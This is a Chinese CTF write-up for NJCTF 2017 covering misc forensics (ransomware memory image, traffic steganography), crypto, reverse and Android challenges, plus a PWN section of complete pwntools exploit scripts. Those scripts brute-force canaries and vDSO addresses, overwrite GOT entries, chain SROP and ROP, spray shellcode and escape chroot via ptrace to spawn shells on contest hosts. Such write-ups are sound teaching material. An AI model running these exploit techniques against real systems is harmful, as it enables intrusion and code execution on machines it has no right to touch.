
# 【CTF攻略】XCTF南京站：NJCTF 2017 Writeup（通关攻略）


                                阅读量   
                                **409437**
                            
                        |
                        
                                                                                                                                    ![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



**[![](./img/85691/t011d4404b7053c078e.jpg)](./img/85691/t011d4404b7053c078e.jpg)**



作者：[Veneno@Nu1L](http://bobao.360.cn/member/contribute?uid=1490911994)

预估稿费：500RMB

投稿方式：发送邮件至[linwei#360.cn](mailto:linwei@360.cn)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿



PS：十分感谢清华的大佬们的高质量题目(第一次写web题这么多的比赛wp，感谢大佬照顾web狗

<br>

**MIsc**

**check QQ**

QQ群看下：

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t018fd77d0cb428a6af.png)

**Shooter**

jpg末尾发现有png文件的IDAT块，提取出来缺少png文件头前四字节，补全打开得到一个二维码，扫描后得到

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0175f7367ca3013ae7.png)

key:"boomboom"!!!

然后拿着"boomboom"!!!试了一大把隐写工具，最后outguess 成功解密。得到 flag。

**easy_crypto**

直接贴脚本：

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t014db614d8b9a01401.png)

**Ransom**

题目提供了一个xp虚拟机的硬盘和内存文件，由于题目没有更多的信息，所以我们首先尝试开启这一虚拟机。一路顺风我们启动了它，看到了桌面上醒目的flag和勒索软件提示页面，大概也猜到了是要干什么了。

观察vmem、vmdk修改时间可知二者并不处于同一状态，大概出题人酱又去偷偷干了什么不可描述的事吧。

于是利用开源内存取证神器Volatility，观察进程树pstree得知WinRAR调用了记事本和rundll32。

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01cb1a4573feee3172.png)

考虑到有窗口信息，于是使用screenshot插件+editbox插件，得知记事本的内容：

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01f0305c455a4e8eac.png)

窗口的分布：

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0155eb5379c8247f57.png)

想着要从内存里把这些文件揪粗来，然而并无任何头绪。于是继续探索，想到可能会有勒索软件的dll注入到进程中，于是将winrar、notepad、rundll32的内存dump出来，顺便也看到了命令行，得知winrar调用图片查看器、记事本来打开文件。脑洞奇大的窝顿时脑补出带着payload的畸形图片无情的欺凌着我们可爱的xp娘blablabla…..

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01270fdb0fc524191f.png)

在经过了一两个小时的混沌后，反射弧奇长的我终于还是反应过来这是一道杂项题而不是re题。目标只有一个，就是拿到压缩包里面的内容。文件可能藏在内存里，也可能是出题人删除了。于是兵分两路，利用openfiles插件dump出文件列表，发现并没有什么东西；另一边挂载vmdk虚拟硬盘，利用DiskGenius恢复文件，得到了.key.zip、private.jpg、public.jpg

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0109c8893a4d7498e1.png)

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t011a4b97b1753a886c.png)

一般的ransomware都是把文件用诸如AES、RC4等对称加密算法加密后再把密钥用RSA加密一次，因为RSA实在是太慢了。如此明确的文件名提示可以看出来有三个aes key，猜测是分别对应了三个flag文件，也印证了刚才的猜想（ ˘•ω• ˘）

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01d4467f1f0fa137fb.png)

于是开始利用private.jpg内存储的HexString尝试解密，发现和一般的RSA并不相同，以为里面存储了d。可是想到public.jpg也是这样的格式，总不可能一个存n一个存d吧。天然呆的窝终于还是想起来了开头的记事本下面有两行out1=private.jpg out2=public.jpg。猜测这两个文件又被加密了，于是开始猜测算法。密钥看着很像Base64，原长度为32，decode后长度会变为24，这两种密钥长度对应常见的算法是AES、3DES、Blowfish。于是利用飘云阁的密码学综合工具尝试解密，发现AES解出第一个block中出现少量明文字串。

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t012eaa7660be0dc396.png)

猜测是由于CBC与ECB模式的原因，于是利用一个在线的AES加解密网站http://aes.online-domain-tools.com/，成功解出private.jpg，但是由于iv未知，导致第一个block的内容丢失。不过好在丢的是“—–BEGIN RSA PRIVATE KEY—–”，不影响使用。

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t017a4020fad828e38f.png)

利用这个私钥再去解密三个aes key，

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t013eca9dceba3951ea.png)

解密后如下：



```
aes key1:YzRhbjBxli9aHy3oHrEtjOiGBLaXUO9U
aes key2:7MBUeEeh3XFMY6tK4OOPonFiKkFRZWWF
aes key3:501v0w08v4qYs3VBg32Kl6ccoT5PZmLx
```

再用aes key解出三个flag文件的内容，发现有大量乱码，但是末尾出有部分 flag出现。

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01de22356e622d7129.png)

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t012128d2d72c468dc0.png)

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t015e2211a03a433405.png)

通过观察猜测flag均从逗号开始，拼接三部分得到最终flag：

```
NJCTF{L3t_Vs_G0ooo0000_g000000_9o}
```

啦啦我是一血OvO

**knock**

字频统计：

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0127f03ed462c87e7b.png)

根据knock将text中的密文分割（下划线代表分隔符）在quipqiup破解换字式密文后得到一段栅栏密码，解密得到flag 

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0153e686dbfb0c1005.png)

**Traffic**

此题有两个关键点。1寻找到正确的藏flag的数据。2 找到合适的算法恢复数据。

Wireshark打开pcap包，各种看，做了非常多的无用功。无意间看到PRIVMSG。使用2进制工具搜索

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01f9b749613c55198d.png)

然后使用strings  xx.pcap|grep  Lord_BIG@&gt; a.txt，得到包含一堆像base64串的数据。

写脚本解开所有base64串发现是一篇文章。

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01b758b8c39ac40cfc.png)

队友使用wireshark搜索提取的字符串，发现跟我提取的结果不一致。

一个文件243个base64串，一个文件240个base串。

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t019e4a0692963d11d1.png)

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t018f412f7a14310b41.png)

Strings简单粗暴，无法过滤重复包之类的。暂时使用队友提供的数据进行分析。

然后卡了很久。不知道下一步干啥。

过了很久队友找到了这个。感觉跟题目很类似。

[http://delimitry.blogspot.nl/2014/02/olympic-ctf-2014-find-da-key-writeup.html](http://delimitry.blogspot.nl/2014/02/olympic-ctf-2014-find-da-key-writeup.html) 

使用题目数据进行验证。

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01d843af14e3c79aee.png)

下一步找数据隐藏算法。写脚本恢复数据。出题人使用包含=的字符串进行数据隐藏。

将所有base64串 先decode，再encode。找出有差异的字符。

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0195750de1da08ab48.png)

发现差值为1，2，3。猜测隐藏了2bit数据。

将所有包含=的字符串参与数据提取运算。得到的数值为0，1，2，3.将所有数据拼接在一起即可解出数据。

组合数据时候，使用穷举的方法。常识了想到的所有可能。2字节数据大小端序，数据块大小端序等。。。

最后得到

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0141ea42fe827a6104.png)

<br>

**PWN**

**Pwn 150 – messager**

Fork server逐字节爆破canary。

脚本：



```
#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
from ctypes import *
import os, sys
io = None
# switches
DEBUG = 0
LOCAL = 0
VERBOSE = 1
# modify this
def makeio():
    global io
    if LOCAL:
        io = remote('localhost', 5555)
    else:
        io = remote('218.2.197.234',2090)
    return io
if VERBOSE: context(log_level='debug')
# define symbols and offsets here
# simplified r/s function
def ru(delim):
    return io.recvuntil(delim)
def rn(count):
    return io.recvn(count)
def ra(count):      # recv all
    buf = ''
    while count:
        tmp = io.recvn(count)
        buf += tmp
        count -= len(tmp)
    return buf
def sl(data):
    return io.sendline(data)
def sn(data):
    return io.send(data)
def info(string):
    return log.info(string)
def dehex(s):
    return s.replace(' ','').decode('hex')
def limu8(x):
    return c_uint8(x).value
def limu16(x):
    return c_uint16(x).value
def limu32(x):
    return c_uint32(x).value
# define interactive functions here
def send(x):
    ru('Welcome!n')
    sn(x)
    return
# define exploit function here
def pwn():
    canary = 'x00'
    while len(canary) != 8:
        for i in xrange(256):
            b = chr(i)
            payload = 104*'A' + canary + b
            io = makeio()
            try:
                print 'sending...', i
                send(payload)
                line = ru('n')
                if 'Message' in line:
                    io.close()
                    canary += b
                    break
            except Exception, e:
                print e
                io.close()
                continue
    info("canary = " + hex(u64(canary)))
    io = makeio()
    payload = 104*'A' + canary + p64(0x12345678) + p64(0x400BC6)
    send(payload)
    io.interactive()
    return
if __name__ == '__main__':
    pwn()
Pwn 300 - pingme
Blind Fsb， 先把binary dump下来，然后直接改printf got表。
脚本：
#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
from ctypes import *
import os, sys
io = None
# switches
DEBUG = 0
LOCAL = 0
VERBOSE = 1
# modify this
def makeio():
    global io
    if LOCAL:
        io = process('xxx')
    else:
        io = remote('218.2.197.235',23745)
    ru('men')
    return io
if VERBOSE: context(log_level='debug')
# define symbols and offsets here
# simplified r/s function
def ru(delim):
    return io.recvuntil(delim)
def rn(count):
    return io.recvn(count)
def ra(count):      # recv all
    buf = ''
    while count:
        tmp = io.recvn(count)
        buf += tmp
        count -= len(tmp)
    return buf
def sl(data):
    return io.sendline(data)
def sn(data):
    return io.send(data)
def info(string):
    return log.info(string)
def dehex(s):
    return s.replace(' ','').decode('hex')
def limu8(x):
    return c_uint8(x).value
def limu16(x):
    return c_uint16(x).value
def limu32(x):
    return c_uint32(x).value
# define interactive functions here
# 8 -&gt; 9
# 12 -&gt; 10
def leak(address):
    if 'n' in p32(address) or 'x00' in p32(address):    return 'x00'
    tem = '~~%9$s~~' + p32(address)
    sl(tem)
    ru('~~')
    data = ru('~~')[:-2]
    return data + 'x00'
# define exploit function here
def pwn():
    global io
    if DEBUG: gdb.attach(io)
    io = makeio()
    '''
    f = open('dump.bin', 'wb')
    address = 0x8048000
    while 1:
        try:
            io = makeio()
            while 1:
                data = leak(address)
                f.write(data)
                address += len(data)
        except Exception, ex:
            io.close()
    f.flush()
    f.close()
    '''
    sl('s')
    ru('s')
    addr = u32(leak(0x8049974)[:4])
    info("leak = " + hex(addr))
    libc = addr - 0x49020
    system = libc + 0x3a940
    info("system = " + hex(system))
    s = p32(system)
    fmtstr = ''
    start = 0
    for i in xrange(len(s)-1):
        if ord(s[i]) &gt;= start:
            pad = ord(s[i]) - start
        else:
            pad = ord(s[i]) - start + 256
        fmtstr += '%' + '{}'.format(pad) + 'c' + '%' + '{}'.format(16+i) + '$hhn'
        start = ord(s[i])
    print len(fmtstr)
    fmtstr = fmtstr.ljust(36, 'A')
    fmtstr += p32(0x8049974)
    fmtstr += p32(0x8049975)
    fmtstr += p32(0x8049976)
    sl(fmtstr)
    sl('/bin/sh;')
    io.interactive()
    return
if __name__ == '__main__':
    pwn()
Pwn 300 - 233
爆破vDSO地址+SROP
脚本：
#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
from ctypes import *
import os, sys
import random
import time
# switches
DEBUG = 1
LOCAL = 0
VERBOSE = 1
io = None
context(arch='i386')
# modify this
def makeio():
    global io
    if LOCAL:
        io = process('233')
    else:
        io = remote('106.14.22.20', 23743)
    return io
if VERBOSE: context(log_level='debug')
# define symbols and offsets here
# simplified r/s function
def ru(delim):
    return io.recvuntil(delim, timeout=4)
def rn(count):
    return io.recvn(count)
def ra(count):      # recv all
    buf = ''
    while count:
        tmp = io.recvn(count)
        buf += tmp
        count -= len(tmp)
    return buf
def sl(data):
    return io.sendline(data)
def sn(data):
    return io.send(data)
def info(string):
    return log.info(string)
def dehex(s):
    return s.replace(' ','').decode('hex')
def limu8(x):
    return c_uint8(x).value
def limu16(x):
    return c_uint16(x).value
def limu32(x):
    return c_uint32(x).value
# define interactive functions here
def rop(ropchain):
    payload = 0x16 * 'A' + ropchain
    payload = payload.ljust(0x400, 'A')
    sn(payload)
    return
shellcode = asm(shellcraft.i386.linux.sh(), arch='i386')
# define exploit function here
def do_pwn(vdso):
    writable = vdso - 0x4000
    payload = ''
    payload += 3 * 'AAAA' + p32(vdso + 0x401)
    frame1 = SigreturnFrame(kernel='amd64')
    frame1.eax = constants.SYS_read
    frame1.ebx = 0
    frame1.ecx = writable + 0x200
    frame1.edx = len(shellcode)
    if LOCAL: frame1.eip = vdso + 0xcde
    else: frame1.eip = vdso + 0x42e
    frame1.esp = writable + len(SigreturnFrame(kernel='amd64')) + len(payload)
    payload += bytes(frame1)
    #payload += 3 * 'AAAA' + p32(vdso + 0xcb1)
    payload += 3 * 'AAAA' + p32(vdso + 0x401)
    frame2 = SigreturnFrame(kernel='amd64')
    frame2.eax = constants.SYS_mprotect
    frame2.ebx = writable
    frame2.ecx = 0x1000
    frame2.edx = 7
    #frame2.eip = vdso + 0xcde
    frame2.eip = vdso + 0x42e
    frame2.esp = writable + len(SigreturnFrame(kernel='amd64')) + len(payload)
    payload += bytes(frame2)
    payload += 3 * 'AAAA' + p32(writable + 0x200)
    frame = SigreturnFrame(kernel='amd64')
    frame.eax = constants.SYS_read
    frame.ebx = 0
    frame.ecx = writable   # page offsets
    frame.edx = len(payload)
    frame.esp = writable    # offset
    #frame.eip = vdso + 0xcde    # sigreturn
    frame.eip = vdso + 0x42e
    roppayload = p32(vdso + 0x401)
    roppayload += bytes(frame)
    rop(roppayload)
    sn(payload)
    sn(shellcode)
    sl('echo pwned')
    sl('ls -la /')
    r = ru('pwned')
    if r != 'pwned':
        raise Exception('not receiving')
    return
def local_get_mapping_address(name):
    procmaps = open('/proc/{0}/maps'.format(io.pid), 'r')
    mappings = procmaps.read()
    procmaps.close()
    t = [c.split(' ') for c in mappings.split('n')]
    libinfo = []
    for l in t:
        k = []
        for i in xrange(len(l)):
            if l[i] == '': continue
            k.append(l[i])
        libinfo.append(k)
    for lib in libinfo:
        if len(lib) == 6:
            if name in lib[5]:
                return int(lib[0].split('-')[0], 16)
    return 0
def pwn():
    global io
    VDSO_RANGE = range(0xf76d0000, 0xf77f0000, 0x1000)
    raw_input()
    if 0:
        #do_pwn(vdso)
        pass
    else:
        count = 0
        while 1:
            io = makeio()
            print "Pwning..."
            vdso = random.choice(VDSO_RANGE)
            info("brute vdso = " + hex(vdso))
            try:
                do_pwn(vdso)
            except:
                io.close()
                count += 1
                info("failed {}".format(count))
                continue
            io.interactive()
            break
    return
if __name__ == '__main__':
    pwn()
```

**Pwn 500 – vegas**

预测Well512伪随机数生成。

脚本：



```
#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from z3 import *
from pwnlib.util.packing import *
from pwn import *   # &lt;3 pwntools, thanks guys :)
#io = process('./vegas.v1.striped')
io = remote('218.2.197.235', 23747)
context(log_level='debug')
prng_state = [BitVec("init_{0}".format(i), 32) for i in range(16)]
def un32(v) : return v &amp; 0xffffffff
# PRNG iteration that works with Z3 bit vectors
def iteration(i):
    next_i = (i+15)&amp;15
    b = prng_state[(i+13)&amp;15] ^ prng_state[i] ^ (prng_state[i] &lt;&lt; 16) ^ (prng_state[(i+13)&amp;15] &lt;&lt; 15)
    c = prng_state[(i+9)&amp;15] ^ ( LShR(prng_state[(i+9)&amp;15], 11) )
    prng_state[(i+10)&amp;15] = c ^ b
    a = prng_state[next_i]
    v9 =  (((8 * (c ^ b)) &amp; 0xDEADBEE8))^ c ^ a ^ (a *2) ^ (b &lt;&lt; 10) ^ (c &lt;&lt; 24)
    prng_state[next_i] = v9
    return next_i
# PRNG iteration that works with normal numbers!
def iteration_numbers(i):
    next_i = (i+15)&amp;15
    b = prng_state[(i+13)&amp;15] ^ prng_state[i] ^ un32(prng_state[i] &lt;&lt; 16) ^ un32(prng_state[(i+13)&amp;15] &lt;&lt; 15)
    c = prng_state[(i+9)&amp;15] ^ ( prng_state[(i+9)&amp;15] &gt;&gt; 11 )
    prng_state[(i+10)&amp;15] = c ^ b
    a = prng_state[next_i]
    v9 =  (((8 * (c ^ b)) &amp; 0xDEADBEE8))^ c ^ a ^ un32(a &lt;&lt; 1) ^ un32(b &lt;&lt; 10) ^ un32(c &lt;&lt; 24)
    prng_state[next_i] = v9
    return next_i
def iteration_attempts(outputs, it_start=0xb):
    global prng_state
    s = Solver()
    it = it_start
    for output in outputs:
        it = iteration(it)
        s.add(prng_state[it] == output)
    return s
def ru(delim):
    return io.recvuntil(delim)
def rn(count):
    return io.recvn(count)
def sl(line):
    return io.sendline(line)
def sn(data):
    return io.send(data)
def menu():
    return ru('Choice:n')
def getone():
    menu()
    sl('1')
    ru('suren')
    sl('3')
    ru('is ')
    number = int(ru('n').strip(),16)
    return number
def writeByte(number, byte):
    assert byte != 'n'
    menu()
    sl('1')
    ru('suren')
    if number &amp; 1: sl('1')
    else: sl('2')
    ru('step:n')
    sl(byte)
    return
def forward(number):
    menu()
    sl('1')
    ru('suren')
    if number &amp; 1: sl('2')
    else: sl('1')
    return
def quit():
    menu()
    sl('3')
    return
def pwn():
    global prng_state
    gdb.attach(io)
    out = []
    for i in xrange(16):
        out.append(getone())
    s = iteration_attempts(out)
    status = s.check()
    print status
    init_state = dict()
    try:
        model = s.model()
        for k in model:
            idx = int(str(k)[5:])
            val = model[k].as_long()
            init_state[idx] = val
    except Exception, ex:
        print ex
        exit(0)
    for i in xrange(16):
        if i in init_state:
            prng_state[i] = init_state[i]
        else:
            prng_state[i] = 0
    it = 0xb
    for i in range(16):
        it = iteration_numbers(it)
    for i in xrange(0x20):
        it = iteration_numbers(it)
        random_value = prng_state[it]
        writeByte(random_value, 'A')
    ru(32*'A')
    stack_leak = u32(rn(4))
    info("stack_leak = " + hex(stack_leak))
    for i in xrange(4):
        it = iteration_numbers(it)
        random_value = prng_state[it]
        writeByte(random_value, p32(stack_leak)[i])
    pad = 'sh;'*4
    ropchain = 'A' + pad[:11] + p32(0x0804860B) * 10 + p32(0x080484E0) + p32(0x08048550) + p32(stack_leak)
    for i in xrange(len(ropchain)):
        it = iteration_numbers(it)
        random_value = prng_state[it]
        writeByte(random_value, ropchain[i])
    quit()
    io.interactive()
    return
if __name__ == '__main__':
    pwn()
```

**Pwn 600 – syscallhelper**

1. Add sycall整数溢出可以改虚表。泄露堆地址，然后跳转到shellcode，由于本地远程堆布局不同，可以喷一些shellcode然后再跳。

2. 逃脱chroot，可以采用ptrace父进程的方法。

脚本：



```
#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
from ctypes import *
from hexdump import hexdump
import os, sys
# switches
LOCAL = 0
DEBUG = LOCAL
VERBOSE = 0
# modify this
if LOCAL:
    io = process('syscallhelper')
else:
    io = remote('218.2.197.234',2088)
if VERBOSE: context(log_level='debug')
# define symbols and offsets here
# simplified r/s function
def ru(delim):
    return io.recvuntil(delim)
def rn(count):
    return io.recvn(count)
def ra(count):      # recv all
    buf = ''
    while count:
        tmp = io.recvn(count)
        buf += tmp
        count -= len(tmp)
    return buf
def sl(data):
    return io.sendline(data)
def sn(data):
    return io.send(data)
def info(string):
    return log.info(string)
def dehex(s):
    return s.replace(' ','').decode('hex')
def limu8(x):
    return c_uint8(x).value
def limu16(x):
    return c_uint16(x).value
def limu32(x):
    return c_uint32(x).value
# define interactive functions here
def menu():
    return ru('option:n')
def setarch(index):
    menu()
    sl('4')
    menu()
    sl(str(index))
    return
def genshellcode():
    menu()
    sl('3')
    return
def setcall(name):
    menu()
    sl('1')
    ru('name:')
    sl(name)
    return
def addcall(name, num, argcount, args):
    menu()
    sl('2')
    ru('name')
    sl(name)
    ru('number')
    sl(str(num))
    ru('(argc)')
    sl(str(argcount))
    for pair in args:
        ru('stop')
        sl(str(pair[0]))
        ru('value')
        sl(pair[1])
    ru('stop')
    sl('0')
    return
def leavemsg(length, content):
    menu()
    sl('5')
    ru('length')
    sl(str(length))
    ru('message')
    if len(content) != length: sl(content)
    else: sn(content)
    return
# define exploit function here
def pwn():
    if DEBUG: gdb.attach(io)
    # uid = 0
    shell_stage1 = '''
    #define BSS_ADDR 0x0814D010
    xor eax, eax
    mov al, 3
    xor ebx, ebx
    mov ecx, BSS_ADDR
    mov edx, 0x12345678
    int 0x80
    mov eax, BSS_ADDR
    call eax
    xor eax, eax
    inc eax
    int 0x80
    '''
    shellasm = '''
    #define PUTS_ADDR 0x08048D30
    #define PRINTF_ADDR 0x08048C70
    #define NUM_STR 0x0804B469
    #define STR_STR 0x0804AEB2
    #define PTRACE_ID 26
    #define GETPPID_ID 64
    #define SPIRNTF_ADDR 0x08048B20
    #define BSS_ADDR 0x0814c010 
    mov eax, GETPPID_ID
    int 0x80
    mov ebx, PTRACE_ATTACH
    mov ecx, eax
    mov eax, PTRACE_ID
    xor edx, edx
    xor esi, esi
    int 0x80
    test eax, eax
    js failed
    jmp next_stage
    get_shellcode:
    pop edi
    mov ebp, 0x20
    mov edx, 0x08049E0D
    write_shellcode:
    mov ebx, PTRACE_POKETEXT
    mov esi, dword ptr [edi]
    mov eax, PTRACE_ID
    int 0x80
    test eax, eax
    js write_shellcode
    mov ebx, 0x100000
    wait:
    dec ebx
    jnz wait
    add edx, 4
    add edi, 4
    dec ebp
    test ebp, ebp
    jnz write_shellcode
detach:
    mov ebx, PTRACE_DETACH
    xor edx, edx
    xor esi, esi
    mov eax, PTRACE_ID
    int 0x80
    mov eax, 1
    int 0x80
    failed:
    mov eax, PUTS_ADDR
    push NUM_STR
    call eax
    mov eax, 1
    int 0x80
    next_stage:
    call get_shellcode
    '''
    sc = asm(shell_stage1, arch='i386')
    sc = sc.rjust(0x600, "x90")
    assert 'n' not in sc
    assert 'x00' not in sc
    sc2 = asm(shellasm, arch='i386')
    sc2 += asm(shellcraft.i386.linux.sh())
    payload = []
    RANGE = 1
    payload = [[-10, p32(0x08048D30)]]
    addcall('ABCDABCDABCDABCD', 0, -1, payload)
    setcall('ABCDABCDABCDABCD')
    genshellcode()
    leak = ru('n')
    if len(leak) &lt; 8:
        info("failed leak.")
        exit(0)
    heap_addr = u32(leak[:4])
    canary = u32(leak[4:8])
    info("heap_addr = " + hex(heap_addr))
    info("canary = " + hex(canary))
    SPRAY_COUNT = 40
    for i in xrange(SPRAY_COUNT):
        leavemsg(len(sc), sc)
    if not LOCAL: offset = 0x30000   # remote
    else: offset = 0x20000    # local
    shellcode_addr = heap_addr + offset
    info("Jumping to = " + hex(shellcode_addr))
    payload = [[-10, p32(shellcode_addr)]]
    addcall('EXPLOIT_EXPLOIT_', 0, -1, payload)
    setcall('EXPLOIT_EXPLOIT_')
    genshellcode()
    sn(sc2)
    io.interactive()
    return
if __name__ == '__main__':
    pwn()
```



**Re**

**echo server**

主要的逻辑是比较输入是否是F1@gA，然后还有dword_804A088是否为0（这个需要手动 patch 成0），然后就会输出一个 hash 值，即为 flag。有些很常见的混淆手段。

**on the fly**

原题：[https://github.com/ernw/ctf-writeups/tree/master/csaw2016/deedeedee](https://github.com/ernw/ctf-writeups/tree/master/csaw2016/deedeedee) 

修改之处是，原题中 xor 的是当前计算出的输出的长度，而本题是输入的长度，故一直为 0x27，另外本题只循环到1 。解题脚本：



```
import std.range : cycle, zip;
import std.conv : to, hexString;
import std.stdio;
char[] enc(char[] data, string base ,int i) {
    auto len = cast(char) to!int(base.length);
    auto c = cycle(base);
    char[] res;
    foreach (tup; zip(c, data))
    {
        res ~= tup[0] ^ tup[1] ^ 0x27;
    }
    writeln(res);
    return res;
}
int main() {
    auto data = hexString!"585d5543506c2474252727272023222623277327257520212527772774247420702f202721756b";
    char[] res = data.dup;
    for (int i = 499; i &gt;= 1; --i) {
        string base = to!string(i);
        res = enc(res, base ~ base ~ base , 499-i);
        writeln(base ~ base ~ base);
    }
    writeln(res);
    return 0;
}
```

**first**

程序先读取输入，然后开启6个线程去计算输入的6部分的 md5，每个部分都是4个字符。如果 md5匹配就把输入存进一个新的数组。然后校验这个新的数组是不是所有字符都合法，如果是的话就输出。

程序的关键点在于6个线程的执行顺序是随机的，程序开始的时候产生了6个随机数，即为每个线程的延迟时间。而且线程的执行顺序会影响到最终结果（后面有个 xor i，顺序错了字符就乱了）。6个线程的执行顺序是6！= 720种。

只要爆破这720种就能拿到 flag。

然而比赛的时候非常幸运，第二次运行就拿到了看起来非常像 flag 的字符串，猜猜改改提交就过了。

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0197a4ddfc2f4e8abd.jpg)

<br>

**Mobile**

**vsvs**

先爆破code，得到第一层code为22，然后有个溢出，直接传/bin/sh就能拿flag了：



```
#!/usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *
import time
REMOTE = 0
LOCAL_REMOTE = 1
LOCAL = 2
rhost = "218.2.197.235"
rport = 23749 
flag = REMOTE
debug = 0
def GetConnection():
    if flag == LOCAL_REMOTE:
        conn = remote(lhost,lport)
        libc_addr = libc_addr_local
    elif flag == REMOTE:
        conn = remote(rhost,rport)
        libc_addr = libc_addr_remote
    elif flag == LOCAL:
        conn = process(local_bin)
        libc_addr = libc_addr_local
    return conn,libc_addr
exp = 1024*"d" + "/bin/sh"
conn,libc_addr = GetConnection()
conn.sendlineafter("access code:n","22")
conn.sendlineafter("input:",exp)
conn.sendlineafter("?",exp)
conn.interactive()
easycrack
```

apk主要逻辑都在so里面，先把包名做了一些操作后和输入异或，然后rc4加密，秘钥是I_am_the_key，解密脚本如下：



```
# -*- coding: utf-8 -*-
import random, base64,binascii
from hashlib import sha1
def crypt(data, key):
    """RC4 algorithm"""
    x = 0
    box = range(256)
    for i in range(256):
        x = (x + box[i] + ord(key[i % len(key)])) % 256
        box[i], box[x] = box[x], box[i]
    x = y = 0
    out = []
    for char in data:
        x = (x + 1) % 256
        y = (y + box[x]) % 256
        box[x], box[y] = box[y], box[x]
        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))
    return ''.join(out)
# 需要加密的数据
data = '7U'Y;J'
# 密钥
key = 'I_am_the_key'
key2 = 'V7D=^,M.E'
ori = "abcdef"
enc1 = ""
dec = binascii.a2b_hex("C8E4EF0E4DCCA683088134F8635E970EEAD9E277F314869F7EF5198A2AA4")
# 解码
decoded_data = crypt(data=dec, key=key)
print decoded_data ,len(decoded_data)
final = []
j = 0
m = 0
length = len(key2)
for i in decoded_data:
    if j&gt;=length:
        j = 0
    final.append(chr(ord(key2[j])^ord(i)))
    print key2[j],"".join(final),hex(ord(key2[j])^ord(i))
    j+=1
    m+=1
```

**littlerotatorgame**

apk通过native activity实现所有的界面操作，通过加速度传感器获取当前设备的x，y，z坐标然后进行判断，so里面用ollvm混淆了但是计算flag的函数比较明显，而且计算flag的参数只有一个int值，所以可以爆破：



```
#include&lt;stdio.h&gt;
int j_j___modsi3(int a,int b)
{
  return a%b;
}
int j_j___divsi3(int a,int b)
{
  return a/b;
}
char flg(int a1, char *out)
{
  char *v2; // r6@1
  int v3; // ST0C_4@1
  int v4; // r4@1
  int v5; // r0@1
  int v6; // ST08_4@1
  int v7; // r5@1
  int v8; // r0@1
  int v9; // r0@1
  char v10; // ST10_1@1
  int v11; // r0@1
  int v12; // r5@1
  int v13; // r0@1
  int v14; // ST18_4@1
  int v15; // r0@1
  int v16; // r0@1
  char v17; // r0@1
  char v18; // ST04_1@1
  int v19; // r0@1
  char v20; // r0@1
  int v21; // r1@1
  int v22; // r5@1
  int v23; // r0@1
  char v24; // r0@1
  v2 = out;
  v3 = a1;
  v4 = a1;
  v5 = j_j___modsi3(a1, 10);
  v6 = v5;
  v7 = 20 * v5;
  *v2 = 20 * v5;
  v8 = j_j___divsi3(v4, 100);
  v9 = j_j___modsi3(v8, 10);
  v10 = v9;
  v11 = 19 * v9 + v7;
  v2[1] = v11;
  v2[2] = v11 - 4;
  v12 = v4;
  v13 = j_j___divsi3(v4, 10);
  v14 = j_j___modsi3(v13, 10);
  v15 = j_j___divsi3(v4, 1000000);
  v2[3] = j_j___modsi3(v15, 10) + 11 * v14;
  v16 = j_j___divsi3(v4, 1000);
  v17 = j_j___modsi3(v16, 10);
  //LOBYTE(v4) = v17;
  v4 = v17;
  v18 = v17;
  v19 = j_j___divsi3(v12, 10000);
  v20 = j_j___modsi3(v19, 10);
  v2[4] = 20 * v4 + 60 - v20 - 60;
  v21 = -v6 - v14;
  v22 = -v21;
  v2[5] = -(char)v21 * v4;
  v2[6] = v14 * v4 * v20;
  v23 = j_j___divsi3(v3, 100000);
  v24 = j_j___modsi3(v23, 10);
